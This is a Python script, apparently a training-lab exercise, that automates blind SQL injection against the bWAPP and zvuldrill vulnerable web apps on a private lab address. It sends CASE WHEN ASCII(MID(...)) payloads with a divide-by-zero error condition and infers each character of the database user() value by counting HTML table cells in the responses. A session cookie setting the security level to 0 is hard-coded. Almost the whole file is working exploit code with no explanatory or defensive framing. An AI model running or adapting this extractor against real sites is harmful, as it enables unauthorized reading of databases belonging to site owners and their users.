from urllib import request
import urllib
from bs4 import BeautifulSoup
import time
import cProfile



class getInfo():

    payloads = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u",
                "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "_"] #判断user字段

    userStr = [] #输出的user字段

    orderByStr = "" #页面可显示的字段数

    url = "" # 固定的sql注入语句

    def __init__(self,url,orderBy,keyTag,keyTagLen,info,cookie=False,decisionLength=False,decisionBs4=True):
        self.url=url
        self.orderBy=orderBy #列数
        self.keyTag=keyTag #标签
        self.keyTagLen=keyTagLen #标签长度
        self.cookie=cookie
        self.info=info

    def getInfoBybs4(self):

        for i in range(1, int(self.orderBy) + 1):  #增加orderby字段
            self.orderByStr += str(i) + ","

        self.orderByStr = self.orderByStr[:-1] #去除最后一个字节

        for position in range(1, 10):

            for i in self.payloads:

                # req = urllib.request.Request(
                #     self.url + "+union+select+" + self.orderByStr + "+from+information_schema.schemata+where+case+when+ASCII(MID(LOWER("+self.info+")," + str(position) + ",1))=ASCII(%22" + i + "%22)+then+1+else+2/0+end+%23")

                #case when ASCII(MID(LOWER(user()),1,1))=114 then 1 else 2/0 end
                req=urllib.request.Request(self.url+"case+when+ASCII(MID(LOWER("+self.info+")," + str(position) + ",1))=ASCII(%22" + i + "%22)+then+1+else+2/0+end")

                if(self.cookie==True):
                    req.add_header('Cookie', 'security_level=0;PHPSESSID=r2rn1sttfeldh3iutamthqduu3')

                b = request.urlopen(req)
                a = b.read()
                soup = BeautifulSoup(a, 'html.parser')
                #soup = BeautifulSoup(request.urlopen(req).read(), 'html.parser')

                print(len(soup.find_all("td")))

                if len(soup.find_all(self.keyTag)) == int(self.keyTagLen):
                    self.userStr.append(i)

        print("".join(str(i) for i in self.userStr))  # 输出当前内容

    def getUserT1(self):

        for i in range(1, int(self.orderBy) + 1):  # 增加orderby字段
            self.orderByStr += str(i) + ","

        self.orderByStr = self.orderByStr[:-1]  # 去除最后一个字节


        # req = urllib.request.Request(
        #     self.url + "+union+select+" + self.orderByStr + "+from+information_schema.schemata+where+case+when+ASCII(MID(LOWER(user()),1,1))=ASCII(%22r%22)+then+1+else+2/0+end+%23")

        req = urllib.request.Request(self.url + "case+when+ASCII(MID(LOWER(user()),1,1))=115+then+1+else+2/0+end")

        if (self.cookie == True):
            req.add_header('Cookie', 'security_level=0;PHPSESSID=r2rn1sttfeldh3iutamthqduu3')

        b=request.urlopen(req)
        a=b.read()

        print(a.decode("UTF-8"))
        soup = BeautifulSoup(a, 'html.parser')

        print(len(soup.find_all("td")))
        print(len(a))


if __name__ == "__main__":

    url1 = "http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%'"

    url2 = "http://192.168.52.128/bWAPP/bWAPP/sqli_2.php?action=go&movie=100"

    url3 = "http://192.168.52.128/bWAPP/bWAPP/sqli_2.php?action=go&movie="

    Info = getInfo(url3, "7", "td", "19","user()",True)

    Info.getInfoBybs4()

    #Info.getUserT1()